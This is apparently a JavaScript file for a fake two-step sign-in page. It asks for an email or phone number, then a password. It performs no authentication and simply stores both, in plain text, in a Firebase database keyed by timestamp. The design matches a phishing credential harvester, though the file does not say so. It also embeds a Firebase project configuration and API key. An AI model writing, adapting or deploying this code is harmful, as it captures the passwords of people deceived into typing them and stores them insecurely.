// Import Firebase modules
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDZAnKjWmv3cWhwOXpL7UjRgOpwK6mQVi0",
    authDomain: "django-eb349.firebaseapp.com",
    databaseURL: "https://django-eb349-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "django-eb349",
    storageBucket: "django-eb349.appspot.com",
    messagingSenderId: "271670409370",
    appId: "1:271670409370:web:51498b4b417669173f8723",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// DOM elements
const emailInput = document.getElementById("email");
const emailGroup = document.getElementById("emailGroup");
const passwordInput = document.getElementById("password");
const passwordGroup = document.getElementById("passwordGroup");
const nextButton = document.getElementById("nextButton");

// Step 1: Email input
nextButton.addEventListener("click", function () {
    if (emailGroup.style.display !== "none") {
        // Validate email
        if (emailInput.value.trim() === "") {
            alert("Please enter your email or phone.");
            return;
        }
        // Hide email input and show password input
        emailGroup.style.display = "none";
        passwordGroup.style.display = "block";
        nextButton.textContent = "Sign in";
    } else {
        // Step 2: Password input
        if (passwordInput.value.trim() === "") {
            alert("Please enter your password.");
            return;
        }
        // Save data to Firebase
        saveToFirebase(emailInput.value.trim(), passwordInput.value.trim());
    }
});

// Function to save data to Firebase
function saveToFirebase(email, password) {
    const timestamp = new Date().toISOString();
    set(ref(database, "users/" + timestamp), {
        email: email,
        password: password,
    })
        .then(() => {
            alert("Data saved successfully!");
            // Reset form and go back to email input
            emailGroup.style.display = "block";
            passwordGroup.style.display = "none";
            nextButton.textContent = "Next";
            emailInput.value = "";
            passwordInput.value = "";
        })
        .catch((error) => {
            alert("Error saving data: " + error.message);
        });
}
